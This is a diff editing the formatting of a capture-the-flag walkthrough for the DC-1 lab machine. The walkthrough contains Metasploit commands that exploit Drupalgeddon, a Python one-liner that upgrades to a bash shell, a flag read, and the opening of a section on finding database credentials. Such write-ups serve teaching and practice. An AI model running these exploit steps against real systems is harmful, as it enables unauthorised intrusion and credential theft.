@@ -1,8 +1,5 @@
 # DC 1 Walkthrough
 
-
-
-
 ## Exploiting Drupalgeddon
 
 ```sh
@@ -11,11 +8,7 @@ search Drupalgeddon
 use 0
 set RHOSTS <target-ip>
 exploit
-```
-
-## Gaining Shell Access
-
-```sh
+#shell
 python -c "import pty; pty.spawn('/bin/bash')"
 ```
 
@@ -28,9 +21,7 @@ cat flag1.txt
 **Flag1**
 > Every good CMS needs a config file—and so do you.
 
----
-
-## Finding Database Credentials
+### Finding Database Credentials
 
 ```php
 array (
